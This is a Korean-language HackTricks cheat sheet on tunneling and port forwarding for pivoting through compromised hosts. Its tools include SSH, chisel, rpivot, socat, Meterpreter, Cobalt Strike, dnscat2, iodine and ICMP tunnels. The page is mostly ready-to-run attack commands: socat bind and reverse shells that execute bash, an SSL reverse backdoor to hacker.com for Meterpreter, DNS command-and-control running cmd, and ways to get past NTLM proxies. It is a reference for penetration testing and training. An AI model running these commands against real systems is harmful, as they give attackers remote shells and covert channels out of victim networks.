# 터널링과 포트 포워딩

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)를 통해 제로부터 AWS 해킹을 배우세요</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!</strong></a><strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고하고 싶으신가요**? 또는 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요, 저희의 독점 [**NFT 컬렉션**](https://opensea.io/collection/the-peass-family)
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요
* **[💬](https://emojipedia.org/speech-balloon/) Discord 그룹**에 **가입**하거나 [텔레그램 그룹](https://t.me/peass)에 **참여**하거나 **트위터** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**를 팔로우**하세요.
* **해킹 트릭을 공유하고 싶으시다면 [hacktricks repo](https://github.com/carlospolop/hacktricks) 및 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**로 PR을 제출하세요.

</details>

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Nmap 팁

{% hint style="warning" %}
**ICMP** 및 **SYN** 스캔은 **소켓 프록시를 통해 터널링할 수 없으므로**, 이를 작동시키려면 **핑 탐지 비활성화**(`-Pn`) 및 **TCP 스캔**(`-sT`)을 지정해야 합니다.
{% endhint %}

## **Bash**

**호스트 -> 점프 -> 내부A -> 내부B**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH 그래픽 연결 (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### 로컬 포트투포트

SSH 서버에서 새 포트 열기 --> 다른 포트
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### 포트투포트

로컬 포트 --> Compromised host (SSH) --> Third\_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

로컬 포트 --> Compromised host (SSH) --> 어디든
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### 역방향 포트 포워딩

내부 호스트로부터 DMZ를 통해 역 쉘을 얻기 위해 유용합니다:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and caputure it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

두 장치 모두 **루트 액세스**가 필요합니다 (새 인터페이스를 생성할 예정이므로) 그리고 sshd 구성에서 루트 로그인을 허용해야 합니다:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ifconfig tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ifconfig tun0 up #Activate the server side network interface
```
서버 측에서 포워딩을 활성화합니다.
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
클라이언트 측에 새 경로를 설정합니다.
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
## SSHUTTLE

호스트를 통해 서브네트워크로 모든 트래픽을 **ssh**를 통해 **터널링**할 수 있습니다.\
예를 들어, 10.10.10.0/24로 가는 모든 트래픽을 전달합니다.
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
개인 키로 연결하세요.
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## 미터프리터

### 포트투포트

로컬 포트 --> Compromised host (active session) --> Third\_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS

### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
다른 방법:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## 코발트 스트라이크

### SOCKS 프록시

팀서버에서 모든 인터페이스에서 수신 대기하는 포트를 열어 **비콘을 통해 트래픽을 라우팅할 수 있도록**합니다.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

{% hint style="warning" %}
이 경우에는 **포트가 비콘 호스트에서 열립니다**, 팀 서버가 아닌 곳에서 트래픽이 팀 서버로 전송되고 해당 호스트:포트로 전달됩니다.
{% endhint %}
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
### rPort2Port 로컬

{% hint style="warning" %}
이 경우에는 **포트가 비콘 호스트에서 열립니다**. 팀 서버가 아닌 **트래픽이 코발트 스트라이크 클라이언트로 전송**되며, 그곳에서 지정된 호스트:포트로 전송됩니다.
{% endhint %}
```
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

웹 파일 터널을 업로드해야 합니다: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## 치젤

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)의 릴리스 페이지에서 다운로드할 수 있습니다.\
클라이언트와 서버에 **동일한 버전을 사용해야** 합니다.

### 소켓
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### 포트 포워딩
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

리버스 터널. 터널은 피해자로부터 시작됩니다.\
127.0.0.1:1080에 socks4 프록시가 생성됩니다.
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
**NTLM 프록시**를 통해 Pivot하기
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### 바인드 쉘
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### 포트투포트
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### 소켓을 통한 포트 간 터널링
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### SSL 소캣을 통한 Meterpreter
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
피해자의 콘솔에서 마지막 줄 대신 이 줄을 실행하여 **인증되지 않은 프록시**를 우회할 수 있습니다:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat 터널

**/bin/sh 콘솔**

양쪽에 인증서 생성: 클라이언트 및 서버
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### 원격 포트투포트

로컬 SSH 포트(22)를 공격자 호스트의 443 포트에 연결합니다.
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

이것은 콘솔 PuTTY 버전과 비슷합니다 (옵션은 ssh 클라이언트와 매우 유사합니다).

피해자에서 실행될 이 실행 파일은 ssh 클라이언트이므로 역 연결을 위해 ssh 서비스와 포트를 열어야 합니다. 그런 다음 로컬에서만 접근 가능한 포트를 우리 기기의 포트로 포워딩하려면:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

어떤 포트든지 로컬 관리자 권한이 필요합니다.
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

시스템을 통해 **RDP 액세스**를 가져야합니다.\
다운로드:

1. [SocksOverRDP x64 바이너리](https://github.com/nccgroup/SocksOverRDP/releases) - 이 도구는 Windows의 원격 데스크톱 서비스 기능에서 `Dynamic Virtual Channels` (`DVC`)를 사용합니다. DVC는 **RDP 연결을 통해 데이터 패킷을 터널링**하는 데 책임이 있습니다.
2. [Proxifier 포터블 바이너리](https://www.proxifier.com/download/#win-tab)

클라이언트 컴퓨터에서 다음과 같이 **`SocksOverRDP-Plugin.dll`**을 로드하십시오:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
이제 **`mstsc.exe`**를 사용하여 **RDP**를 통해 **피해자**에게 **연결**할 수 있으며, **SocksOverRDP 플러그인이 활성화**되었다는 **알림**을 받아야 합니다. 이 플러그인은 **127.0.0.1:1080**에서 **수신**할 것입니다.

**RDP**를 통해 **연결**하고 **피해자** 컴퓨터에 `SocksOverRDP-Server.exe` 이진 파일을 **업로드**하고 실행하세요:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
지금, 공격자인 당신의 기기에서 포트 1080이 수신 대기 중인지 확인하십시오:
```
netstat -antb | findstr 1080
```
이제 해당 포트를 통해 트래픽을 프록시할 수 있습니다.

## Windows GUI 앱 프록시화

[**Proxifier**](https://www.proxifier.com/)를 사용하여 Windows GUI 앱을 프록시로 이동시킬 수 있습니다.\
**프로필 -> 프록시 서버**에서 SOCKS 서버의 IP 및 포트를 추가합니다.\
**프로필 -> 프록시화 규칙**에 프록시화할 프로그램 이름과 프록시화하려는 IP 연결을 추가합니다.

## NTLM 프록시 우회

이전에 언급된 도구: **Rpivot**\
**OpenVPN**도 이를 우회할 수 있으며, 구성 파일에서 다음 옵션을 설정합니다:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

프록시에 대한 인증을 수행하고 외부 서비스로 포워딩되는 로컬 포트를 바인딩합니다. 그런 다음이 포트를 통해 선택한 도구를 사용할 수 있습니다.\
예를 들어 포트 443을 전달합니다.
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
이제, 예를 들어 피해자에서 **SSH** 서비스를 포트 443에서 수신 대기하도록 설정했다고 가정해보겠습니다. 공격자 포트 2222를 통해 해당 서비스에 연결할 수 있습니다.\
로컬호스트:443로 연결하는 **meterpreter**를 사용할 수도 있으며, 공격자는 포트 2222에서 수신 대기합니다.

## YARP

Microsoft가 만든 리버스 프록시입니다. 여기에서 찾을 수 있습니다: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

두 시스템 모두에서 루트 권한이 필요하며, DNS 쿼리를 사용하여 터널 어댑터를 생성하고 데이터를 전송합니다.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
터널은 매우 느릴 수 있습니다. 다음을 사용하여 이 터널을 통해 압축된 SSH 연결을 생성할 수 있습니다:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**여기에서 다운로드하세요**](https://github.com/iagox86/dnscat2)**.**

DNS를 통해 C\&C 채널을 설정합니다. 루트 권한이 필요하지 않습니다.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **PowerShell**

파워쉘에서 [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell)을 사용하여 dnscat2 클라이언트를 실행할 수 있습니다:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **dnscat을 사용한 포트 포워딩**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### 프록시체인 DNS 변경

프록시체인은 `gethostbyname` libc 호출을 가로채서 tcp DNS 요청을 socks 프록시를 통해 터널링합니다. **기본적으로** 프록시체인이 사용하는 **DNS** 서버는 **4.2.2.2**로 (하드코딩) 설정되어 있습니다. 이를 변경하려면 파일을 편집하세요: _/usr/lib/proxychains3/proxyresolv_ 그리고 IP를 변경하세요. **Windows 환경**에서는 **도메인 컨트롤러**의 IP를 설정할 수 있습니다.

## Go에서의 터널

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## ICMP 터널링

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

두 시스템 모두에서 루트 권한이 필요하며, ICMP 에코 요청을 사용하여 터널 어댑터를 생성하고 데이터를 터널링하기 위해 필요합니다.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**여기서 다운로드하세요**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

**[ngrok](https://ngrok.com/)은 한 줄의 명령어로 솔루션을 인터넷에 노출시키는 도구입니다.**
*노출 URI는 다음과 같습니다:* **UID.ngrok.io**

### 설치

- 계정 생성: https://ngrok.com/signup
- 클라이언트 다운로드:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### 기본 사용법

**문서:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

*필요한 경우 인증 및 TLS를 추가할 수도 있습니다.*

#### TCP 터널링
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### HTTP를 통해 파일 노출하기
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### HTTP 호출 가로채기

*XSS, SSRF, SSTI에 유용...*
stdout에서 직접 또는 HTTP 인터페이스 [http://127.0.0.1:4040](http://127.0.0.1:4000)에서. 

#### 내부 HTTP 서비스 터널링
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml 간단한 구성 예시

3개의 터널을 엽니다:
- 2개의 TCP
- /tmp/httpbin/에서 정적 파일 노출을 하는 1개의 HTTP
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## 다른 확인할 도구

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

<details>

<summary><strong>제로부터 히어로가 되기까지 AWS 해킹 배우기</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* **사이버 보안 회사에서 일하시나요? 귀하의 회사가 HackTricks에서 광고되길 원하시나요? 또는 PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!**
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 저희의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* [**공식 PEASS & HackTricks 스왹**](https://peass.creator-spring.com)을 받으세요
* **[💬](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나 **트위터** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**를 팔로우하세요.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks) 및 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)에 PR을 제출하여 해킹 트릭을 공유하세요.**

</details>
